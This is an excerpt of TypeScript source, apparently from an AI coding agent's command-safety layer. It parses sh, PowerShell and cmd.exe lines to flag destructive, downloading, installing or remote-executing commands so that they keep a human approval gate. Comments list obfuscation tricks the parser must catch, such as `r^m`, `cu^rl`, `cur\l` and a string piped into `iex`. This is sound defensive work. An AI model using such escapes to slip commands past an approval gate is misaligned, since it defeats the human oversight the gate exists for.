    bindPsArguments(args, sig).some((b) => b.names?.some((n) => names.includes(n)) === true);
  switch (head.toLowerCase()) {
    case 'start-job':
    case 'sajb':
    case 'start-threadjob':
      return true;
    case 'foreach-object':
    case '%':
    case 'foreach':
      return bindsOne(FOREACH_OBJECT, ['parallel', 'usenewrunspace']);
    case 'invoke-command':
    case 'icm':
      return bindsOne(INVOKE_COMMAND, [
        'computername',
        'session',
        'connectionuri',
        'vmid',
        'vmname',
        'containerid',
        'hostname',
        'sshconnection',
        'asjob',
        'indisconnectedsession',
      ]);
    default:
      return false;
  }
}

/** True when `ch` is one of `set` (never the empty string). */
const oneOf = (ch: string, set: string): boolean => ch !== '' && set.includes(ch);

/**
 * What one operator of a line read with sh's or PowerShell's grammar says of
 * the processes its commands run in (`Processes`). `command`: the words of the
 * command written before it, none when it starts one.
 */
function readOperator(
  processes: Processes,
  line: string,
  at: number,
  command: readonly string[],
): void {
  const ch = line[at] ?? '';
  const prev = line[at - 1] ?? '';
  const next = line[at + 1] ?? '';
  switch (ch) {
    case '(':
      processes.open(
        oneOf(prev, '$@<>') ? 'substitution' : command.length === 0 ? 'start' : 'after-word',
        command,
      );
      return;
    case '{':
      processes.open('brace', command);
      return;
    case ')':
    case '}':
      processes.close();
      return;
    case '|':
      // `||` is a list; `>|` a redirection; `|&` a pipe.
      if (next === '|') processes.andOr('||');
      else if (prev !== '|' && prev !== '>') processes.pipe();
      return;
    case '&':
      // `&&` is a list; `>&2`, `<&3`, `&>f` redirections; `|&` a pipe. The
      // `&` of a case's `;&` sends nothing back: its `;` began a new list.
      if (next === '&') processes.andOr('&&');
      else if (prev !== '&' && !oneOf(prev, '<>|') && next !== '>')
        processes.ampersand(line.slice(at + 1));
      return;
    case ';':
      // `;;`, `;&`, `;;&` end a case clause: a pattern comes next.
      if (next === ';' || next === '&') processes.patternNext();
      processes.next();
      return;
    default:
      processes.next();
  }
}

/**
 * Read a line with the grammar of sh or PowerShell, words and commands in one
 * pass. In sh, a here-document's body is not script grammar: its lines are
 * read as the commands of the shell it feeds, and, unless its marker is
 * quoted, the substitutions in it run; to any other program it is data. With
 * `hereDocs`, the here-documents met are reported there. `model`: the shell
 * whose processes the commands run in (`Processes`, #717).
 */
function scanLine(
  line: string,
  g: Grammar,
  hereDocs?: HereDocument[],
  model: LineShell = g === SH ? 'sh' : 'powershell',
): ShellWord[][] {
  const segments: ShellWord[][] = [];
  const processes = new Processes(model, segments);
  let words: Array<{ text: string; quoted: boolean; start: number }> = [];
  let word = '';
  let inWord = false;
  let quoted = false;
  let start = 0;
  let quote: string | null = null;
  const begin = (at: number): void => {
    if (!inWord) {
      inWord = true;
      start = at;
    }
  };
  // Where `<<` is no redirection in sh: arithmetic and `[[ ]]` (#635).
  let arithmetic = 0;
  let doubleBracket = false;
  let letCommand = false;
  // Here-documents opened on the current line: their bodies start after it.
  const pending: Array<
    Omit<HereDocument, 'bodyStart' | 'bodyEnd' | 'end' | 'receiver'> & { before: string }
  > = [];
  // The redirections of the command being read; `redirect`: the next word is
  // the target of the one just met (`readRedirection`).
  let redirects: Redirection[] = [];
  let redirect: { write: boolean; duplicates: boolean } | null = null;
  const endWord = (): void => {
    if (inWord && redirect !== null) {
      // `>&2`, `>&-` copy a descriptor; `>&file` (bash) writes both streams to it.
      if (!(redirect.duplicates && !quoted && /^(\d+|-)$/.test(word)))
        redirects.push({ write: redirect.write, path: word });
      redirect = null;
    } else if (inWord) {
      if (!quoted && word === '[[') doubleBracket = true;
      else if (!quoted && word === ']]') doubleBracket = false;
      else if (!quoted && word === 'let' && words.length === 0) letCommand = true;
      words.push({ text: word, quoted, start });
    }
    word = '';
    inWord = false;
    quoted = false;
  };
  // PowerShell binds a literal piped into a command to its input: `'cmd' |
  // iex` runs that string. It is read as the command's argument when it has
  // none (review of PR #682, pass 8).
  let piped: ShellWord | null = null;
  const endCommand = (at: number, separator = ''): void => {
    endWord();
    letCommand = false;
    if (words.length > 0) {
      const segment: ShellWord[] = words.map((w) => ({
        text: w.text,
        quoted: w.quoted,
        tail: line.slice(w.start, at),
      }));
      if (piped !== null && segment.length === 1) segment.push(piped);
      segments.push(segment);
      processes.command();
      processes.redirectCommand(redirects);
      piped = null;
      if (g === POWERSHELL && separator === '|' && segment.length === 1 && segment[0]?.quoted)
        piped = segment[0];
    } else {
      piped = null;
      processes.redirectGroup(redirects);
    }
    words = [];
    redirects = [];
    redirect = null;
  };
  for (let at = 0; at < line.length; at++) {
    const ch = line[at] ?? '';
    const next = line[at + 1] ?? '';
    if (quote !== null) {
      if (ch === quote) {
        if (g.doubledQuote && next === quote) {
          word += quote;
          at += 1;
        } else quote = null;
      } else if (quote === '"' && g.escapesInDouble(ch, next)) {
        word += next;
        at += 1;
      } else word += ch;
      continue;
    }
    // sh: a `#` that starts a word starts a comment, to the end of the line
    // (after a separator, `)`, `;`, `|`, a backtick or a space alike).
    // PowerShell too: `#` starting a word, to the end of the line, and
    // `<# … #>` (Nodal review of PR #721, pass 14).
    if (ch === '#' && (!inWord || (g === SH && line[at - 1] === '`'))) {
      const end = line.indexOf('\n', at);
      at = (end < 0 ? line.length : end) - 1;
      continue;
    }
    if (g === POWERSHELL && ch === '<' && next === '#' && !inWord) {
      const end = line.indexOf('#>', at + 2);
      at = end < 0 ? line.length - 1 : end + 1;
      continue;
    }
    // Where a case expects a pattern (after `in`, `;;`, `;&`, `;;&`), what
    // comes up to its `)` is one (`done)`, `start|stop)`, `(if)`,
    // `@(a|b))`): no command and no reserved word (Nodal review of PR #721,
    // passes 11 and 12, measured in bash). As bash does, `esac` is tested
    // first: it closes the case (`(case …;; esac)`). Read for a line sh runs,
    // whatever grammar reads its words (`downloadWrites`).
    if (model === 'sh' && !inWord && !/[\s;&|)<>]/.test(ch)) {
      // `case X in`, wherever a command may start (`then case …`, `! case …`):
      // its first pattern may follow on its line.
      const reserved = (i: number): string => (words[i]?.quoted === false ? words[i].text : '');
      let k = 0;
      for (let next = shNextCommand(reserved, k); next !== null; next = shNextCommand(reserved, k))
        k = next;
      if (reserved(k) === 'case' && words.length === k + 3 && reserved(k + 2) === 'in')
        endCommand(at);
      const esac = line.startsWith('esac', at) && /^[\s;&|()<>]?$/.test(line[at + 4] ?? '');
      if (words.length === 0 && processes.expectsPattern() && !esac) {
        const end = casePatternEnd(line, at);
        processes.patternRead();
        if (typeof end === 'number') {
          at = end;
          continue;
        }
        // A pattern cut by a new line, `;` or `&`: bash refuses the line.
        // What it runs is not known here: a program decided at run time,
        // which asks. A text that ends inside one is a piece of a line read
        // apart (`$(case $x in a)`, cut by the substitution pass), whose
        // whole the scan reads.
        if (end === 'cut') {
          segments.push([{ text: '$(…)', quoted: false }]);
          processes.command();
        }
      }
    }
    if (g === SH) {
      if (line.startsWith('$((', at) || (line.startsWith('((', at) && line[at - 1] !== '$'))
        arithmetic += 1;
      else if (arithmetic > 0 && line.startsWith('))', at)) arithmetic -= 1;
    }
    if (
      g === SH &&
      ch === '<' &&
      line[at - 1] !== '<' &&
      arithmetic === 0 &&
      !doubleBracket &&
      !letCommand
    ) {
      const m = HERE_DOC_MARKER.exec(line.slice(at));
      if (m !== null && line[at + 2] !== '<') {
        pending.push({
          index: at,
          length: m[0].length,
          strip: m[1] === '-',
          marker: m[4] ?? '',
          quotedMarker: m[2] === '\\' || m[3] !== '',
          // The command so far, as the shell will run it: its reader is
          // read by the common reading (`stdinReceiver`), never its first word.
          before: [
            ...words.map((w) => (w.quoted ? `'${w.text}'` : w.text)),
            ...(inWord ? [word] : []),
          ].join(' '),
        });
      }
    }
    // sh's `$'…'` is one quoted word, whose backslash escapes a quote too
    // (`$'a\'b'` is `a'b`): read as a single-quoted span, the rest of the line
    // would hide in it (Nodal review of PR #721, pass 14, measured in bash).
    if (g === SH && ch === '$' && next === "'") {
      begin(at);
      quoted = true;
      const end = ansiQuoteEnd(line, at);
      word += line.slice(at + 2, end).replace(/\\([\s\S])/g, '$1');
      at = end;
      continue;
    }
    if (g.quotes.includes(ch)) {
      begin(at);
      quote = ch;
      quoted = true;
    } else if (ch === g.escape) {
      // An escaped word is quoted as much as a quoted one: no reserved word,
      // no expansion of what is escaped (`\done`, `\$x`).
      begin(at);
      word += next;
      quoted = true;
      at += 1;
    } else if (
      (ch === '>' ||
        (ch === '<' && next !== '<' && line[at - 1] !== '<') ||
        (g === SH && ch === '&' && next === '>')) &&
      next !== '(' &&
      (g !== SH || (arithmetic === 0 && !doubleBracket && !letCommand))
    ) {
      // A redirection (`> f`, `2>>log`, `&>f`, `>|f`, `<in`, `<>f`, `2>&1`,
      // PowerShell's `*>f`) is no word of the command: the shell opens it
      // before running it. Its target is the next word, read like any other
      // (quotes joined, escapes taken out: sh's `.\./out` is `../out`), kept
      // with the command (`COMMAND_REDIRECTIONS`, Nodal review of PR #721,
      // pass 8). The descriptor glued before it (`2>`) goes with it; the `&`
      // of a duplication separates nothing.
      if (
        redirect === null &&
        inWord &&
        !quoted &&
        (/^\d+$/.test(word) || (g === POWERSHELL && word === '*'))
      ) {
        word = '';
        inWord = false;
      } else endWord();
      let k = at + 1;
      let write = ch !== '<';
      if (ch === '&' || (ch === '>' && (line[k] === '>' || line[k] === '|'))) k += 1;
      if (ch === '&' && line[k] === '>') k += 1;
      if (ch === '<' && line[k] === '>') {
        write = true;
        k += 1;
      }
      const duplicates = ch !== '&' && line[k] === '&';
      if (duplicates) k += 1;
      redirect = { write, duplicates };
      at = k - 1;
    } else if (g.separators.includes(ch)) {
      const command = [...words.map((w) => w.text), ...(inWord ? [word] : [])];
      endCommand(at, ch);
      readOperator(processes, line, at, command);
      // The line that opened here-documents ends: their bodies follow, each
      // up to its end marker, outside the script's grammar.
      if (ch === '\n' && pending.length > 0) {
        // What a here-document feeds runs in the program it feeds, and a
        // substitution in its body in a subshell: neither is the line's process.
        const runApart = (read: ShellWord[][]): void => {
          const path = [...processes.here(), newProcess()];
          for (const words of read) {
            COMMAND_PROCESS.set(words, [...path, ...(COMMAND_PROCESS.get(words) ?? [])]);
            segments.push(words);
          }
        };
        let from = at + 1;
        for (const { before, ...op } of pending) {
          const ends = bodyEnd(line, from, op.strip, op.marker);
          if (ends === null) break;
          const lineEnd = line.indexOf('\n', op.index);
          const receiver = stdinReceiver(before, line.slice(op.index + op.length, lineEnd));
          const doc: HereDocument = { ...op, receiver, bodyStart: from, ...ends };
          hereDocs?.push(doc);
          const body = line.slice(doc.bodyStart, doc.bodyEnd);
          // A shell runs its lines, and so does a reader the reading cannot
          // place: judged as commands, never taken for data unproven. An
          // interpreter's body is its source (program-sources.ts).
          if (receiver.kind === 'shell' || receiver.kind === 'doubt') {
            if (receiver.program === 'cmd') runApart(cmdCommands(body));
            else
              runApart(
                scanLine(
                  body,
                  ['powershell', 'pwsh', 'iex', 'invoke-expression'].includes(
                    receiver.program ?? '',
                  )
                    ? POWERSHELL
                    : SH,
                ),
              );
          }
          if (!op.quotedMarker)
            for (const inner of substitutionsOf(body, 'sh')) runApart(scanLine(inner, SH));
          from = doc.end;
        }
        pending.length = 0;
        at = from - 1;
        continue;
      }
      // PowerShell's call operator starts a command whose program follows it;
      // before a parenthesised expression, that program is decided at run time.
      // The second `&` of `&&` (PowerShell 7's chain) is none.
      if (g === POWERSHELL && ch === '&' && next !== '&' && line[at - 1] !== '&') {
        const after = line.slice(at + 1).trimStart();
        words.push({ text: '&', quoted: false, start: at });
        if (after.startsWith('(')) words.push({ text: '$(…)', quoted: false, start: at });
      }
    } else if (/\s/.test(ch) || ch === '<' || ch === '>') {
      endWord();
    } else {
      begin(at);
      word += ch;
    }
  }
  endCommand(line.length);
  return segments;
}

/**
 * cmd.exe's commands: `&`, `|`, newlines and its `( )` blocks end one,
 * outside quotes; a double quote toggles a quoted span (a single quote is a
 * character, a backslash is a character: cmd has no backslash escape); `^`
 * escapes the next character outside quotes and is removed (`r^m` runs `rm`).
 * Each command keeps its raw text: the program reads its own words, by the
 * Windows argument rules, its redirections taken out as cmd takes them out
 * (`cmdRedirection`). Which run in a process of their own: `Processes`.
 */
function cmdCommands(line: string): ShellWord[][] {
  const commands: ShellWord[][] = [];
  const processes = new Processes('cmd', commands);
  // `@` before a command (`@lpr x`, `& @rd …`) is cmd's echo-off prefix, never
  // part of the program's name (review of PR #682, pass 6).
  const text = (c: string): string => c.replace(/^(\s*@)+/, '');
  let current = '';
  let inQuote = false;
  let redirects: Redirection[] = [];
  const end = (): void => {
    const words = text(current).trim() === '' ? [] : windowsArguments(text(current));
    if (words.length > 0) {
      commands.push(words);
      processes.command();
      processes.redirectCommand(redirects);
    } else processes.redirectGroup(redirects);
    current = '';
    redirects = [];
  };
  for (let at = 0; at < line.length; at++) {
    const ch = line[at] ?? '';
    if (ch === '"') {
      inQuote = !inQuote;
      current += ch;
    } else if (inQuote) {
      current += ch;
    } else if (ch === '^') {
      current += line[at + 1] ?? '';
      at += 1;
    } else if (ch === '>' || ch === '<') {
      // A redirection (`>out`, `2>>log`, `<in`, `2>&1`, `<&0`) is no word of
      // the command: cmd takes it out before running it, the handle glued
      // before it (`2>`) with it. The `&` of a handle duplication separates
      // nothing (Nodal review of PR #721, pass 5); with a space before it
      // (`2> &1`) cmd refuses the line, and it separates nothing either. Its
      // target is kept with the command (`COMMAND_REDIRECTIONS`, pass 8).
      current = current.replace(/(^|\s)\d$/, '$1');
      const read = cmdRedirection(line, at);
      if (read.path !== null) redirects.push({ write: ch === '>', path: read.path });
      at = read.end;
      current += ' ';
    } else if ('&|\n\r()'.includes(ch)) {
      const before = text(current).trim();
      end();
      if (ch === '(') processes.open(before === '' ? 'start' : 'after-word', before.split(/\s+/));
      else if (ch === ')') processes.close();
      else if ((ch === '&' || ch === '|') && line[at + 1] === ch) {
        // `&&` and `||`: the next command runs on the result of this one.
        processes.andOr(ch === '&' ? '&&' : '||');
        at += 1;
      } else if (ch === '|') processes.pipe();
      else processes.next();
    } else current += ch;
  }
  end();
  return commands;
}

/**
 * Where the case pattern that starts at `at` ends: its first `)` left open,
 * past an opening `(`, quotes and escapes, `|` between alternatives, and the
 * parentheses of an extglob, which balance (`@(a|b(c)))`, pass 12); `cut`
 * when a new line, `;` or `&` comes first, `eof` when the text ends first.
 */
function casePatternEnd(line: string, at: number): number | 'cut' | 'eof' {
  let depth = 0;
  for (let j = line[at] === '(' ? at + 1 : at; j < line.length; j++) {
    const c = line[j];
    if (c === '\\') j += 1;
    else if (c === '$' && line[j + 1] === "'") j = ansiQuoteEnd(line, j);
    else if (c === "'" || c === '"') {
      const close = line.indexOf(c, j + 1);
      if (close < 0) return 'eof';
      j = close;
    } else if (c === '(') depth += 1;
    else if (c === ')') {
      if (depth === 0) return j;
      depth -= 1;
    } else if (c === '\n' || c === ';' || c === '&') return 'cut';
  }
  return 'eof';
}

/**
 * The cmd redirection that starts at `at` (its `>` or `<`): where it ends (the
 * index of its last character) and its target, read as cmd reads a word:
 * past the spaces, up to the next operator or space outside quotes, quotes
 * joined and taken out, a caret taking the next character out of any meaning
 * (`"a"b` is `ab`, `..^\x` is `..\x`); none for a handle (`&1`). The first `>`
 * of `>>` reads an empty target, the second the real one.
 */
function cmdRedirection(line: string, at: number): { end: number; path: string | null } {
  let i = at + 1;
  while (line[i] === ' ' || line[i] === '\t') i += 1;
  if (line[i] === '&') {
    i += 1;
    while (/\d/.test(line[i] ?? '')) i += 1;
    return { end: i - 1, path: null };
  }
  let path = '';
  let inQuote = false;
  for (; i < line.length; i += 1) {
    const c = line[i] ?? '';
    if (c === '"') inQuote = !inQuote;
    else if (inQuote) path += c;
    else if (c === '^') path += line[++i] ?? '';
    else if (/[\s&|()<>]/.test(c)) break;
    else path += c;
  }
  return { end: i - 1, path: path === '' ? null : path };
}

/**
 * The words of a Windows command line, as a program reads its arguments
 * (CommandLineToArgvW): spaces split outside quotes, a double quote toggles,
 * `2n` backslashes before a quote are `n` and the quote toggles, `2n+1` are
 * `n` and a literal quote, other backslashes are characters (`C:\x`), and `""`
 * inside quotes is a quote. `<` and `>` end a word (redirections).
 */
function windowsArguments(line: string): ShellWord[] {
  const words: ShellWord[] = [];
  let at = 0;
  while (at < line.length) {
    while (at < line.length && /[\s<>]/.test(line[at] ?? '')) at += 1;
    if (at >= line.length) break;
    const start = at;
    let text = '';
    let quoted = false;
    let inQuote = false;
    while (at < line.length) {
      const ch = line[at] ?? '';
      if (!inQuote && /[\s<>]/.test(ch)) break;
      if (ch === '\\') {
        let n = 0;
        while (line[at + n] === '\\') n += 1;
        if (line[at + n] === '"') {
          text += '\\'.repeat(Math.floor(n / 2));
          if (n % 2 === 1) {
            text += '"';
            at += n + 1;
          } else at += n;
        } else {
          text += '\\'.repeat(n);
          at += n;
        }
        continue;
      }
      if (ch === '"') {
        quoted = true;
        if (inQuote && line[at + 1] === '"') {
          text += '"';
          at += 2;
          continue;
        }
        inQuote = !inQuote;
        at += 1;
        continue;
      }
      text += ch;
      at += 1;
    }
    words.push({ text, quoted, tail: line.slice(start) });
  }
  return words;
}

/**
 * True when `cmd` performs a destructive or heavy, hard-to-undo action. Used by
 * the `destructive_gate` autonomy level: such a command keeps its approval gate
 * while ordinary commands auto-run. Catastrophic commands are a subset (always
 * true here too).
 */
export function isDestructiveOrHeavyCommand(cmd: string, host?: ShellHost): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  // Catastrophic (machine-destroyers) and opaque interpreter-eval both keep
  // their gate under destructive_gate. Inline-eval is no longer catastrophic
  // (approvable), but it stays "heavy" here so destructive_gate still asks a
  // human before running an un-inspectable one-liner.
  if (isCatastrophicCommand(cmd, host) || isInlineInterpreterEvalCommand(cmd, host)) return true;
  // Every program only asked for its version or help: nothing happens.
  const units = commandUnits(cmd, 0, topShell(host));
  // A wrapper's own words are not work, but a launcher that reaches out is.
  const working = units.filter((u) => !runsAnother(u) || reachesOut(u));
  if (working.length > 0 && working.every(isReadUnit)) return false;
  const c = normalizeSlashes(cmd.trim());
  return (
    DESTRUCTIVE_PATTERNS.some((re) => re.test(c)) ||
    units.some(
      (u) =>
        curlWritesAFile(u) || installsSoftware(u) || unitCategories(u).includes('open_or_send'),
    )
  );
}

/** The read flags the catastrophic floor lets through: never `-h` (`shutdown -h` halts). */
const FLOOR_READ_FLAGS = new Set(['--help', '--version', '/?']);

/** The flags that make a program print its version or its help, and exit. */
const VERSION_OR_HELP = new Set(['--version', '-V', '--help', '-h', '-?', '/?']);

/**
 * A program called only for its version or its help (`aria2c --version`,
 * `wget -h`) prints and exits: it is no kind of action, whatever the program
 * does otherwise (Reviewer A, #582; the class of #552, a read taken for the
 * action it is about). One more word, an URL or a subcommand, and it is the
 * program at work again.
 */
function isVersionOrHelpOnly(unit: readonly string[]): boolean {
  return unit.length >= 2 && unit.slice(1).every((t) => VERSION_OR_HELP.has(t));
}

/**
 * `curl URL > file` downloads without `-o`: a program that prints what it
 * fetches, its output written to a file (`UNIT_REDIRECTIONS`). Read on the
 * unit, the program as the shell resolves its name (`cur\l`, `cu^rl` are
 * curl, Nodal review of PR #721, pass 8), never on the text. `curl --version
 * > log` is still a read.
 */
function downloadsToItsOutput(unit: readonly string[]): boolean {
  return (
    /^(curl|irm|invoke-restmethod)$/i.test(unit[0] ?? '') &&
    (UNIT_REDIRECTIONS.get(unit) ?? []).some((r) => r.write) &&
    !isVersionOrHelpOnly(unit)
  );
}

/**
 * The help of a SUBCOMMAND: words, then only version or help flags (`pip
 * download --help`, `comfy model download --help`, `ollama pull llama3 -h`).
 */
function isSubcommandHelp(unit: readonly string[]): boolean {
  const args = unit.slice(1);
  const firstFlag = args.findIndex((t) => t.startsWith('-') || t.startsWith('/'));
  if (firstFlag <= 0) return false;
  return args.slice(firstFlag).every((t) => VERSION_OR_HELP.has(t));
}

/**
 * The kinds whose programs all print the help of a subcommand and exit: the
 * fetchers and installers (pip, npm, comfy, docker, git, hf, ollama, wget…).
 * Not the others: cmd's `del` and `rd` read `--help` as one more file name,
 * bash's `kill` still sends its signal (Reviewer A, #582 pass 2).
 */
const SUBCOMMAND_HELP_EXCUSES: ReadonlySet<StaticShellCategory> = new Set([
  'download',
  'install_software',
]);

/** The kinds of one command unit, read from its patterns, before any excuse. */
function patternKinds(unit: readonly string[]): Array<keyof typeof STATIC_SHELL_CATEGORY_PATTERNS> {
  const text = normalizeSlashes(unit.join(' '));
  return (
    Object.entries(STATIC_SHELL_CATEGORY_PATTERNS) as Array<
      [keyof typeof STATIC_SHELL_CATEGORY_PATTERNS, readonly RegExp[]]
    >
  )
    .filter(
      ([category, patterns]) =>
        patterns.some((re) => startsWithMatch(re, text)) ||
        (category === 'download' && curlWritesAFile(unit)) ||
        (category === 'install_software' && installsSoftware(unit)),
    )
    .map(([category]) => category);
}

/**
 * A `curl` that writes a file: the same reading as where it writes
 * (`fetcherTargets`), so the kind and the target never disagree (#614, revue
 * Nodal de la PR #618, passe 3 : `-sLoC:\x` échappait aux deux).
 */
function curlWritesAFile(unit: readonly string[]): boolean {
  return unit[0] === 'curl' && fetcherTargets('curl', unit.slice(1)).length > 0;
}

/** The kinds one command unit performs: none for a version or help check. */
function unitCategories(unit: readonly string[]): StaticShellCategory[] {
  if (isVersionOrHelpOnly(unit) && !opensWhateverAsked(unit)) return [];
  const kinds: StaticShellCategory[] = patternKinds(unit);
  if (reachesOut(unit)) kinds.push('open_or_send');
  return isSubcommandHelp(unit) ? kinds.filter((k) => !SUBCOMMAND_HELP_EXCUSES.has(k)) : kinds;
}

/** A unit that only prints: a version or help check, or the help of a fetch or install subcommand. */
function isReadUnit(unit: readonly string[]): boolean {
  if (opensWhateverAsked(unit)) return false;
  if (isVersionOrHelpOnly(unit)) return true;
  if (!isSubcommandHelp(unit)) return false;
  const kinds = patternKinds(unit);
  return kinds.length > 0 && kinds.every((k) => SUBCOMMAND_HELP_EXCUSES.has(k));
}
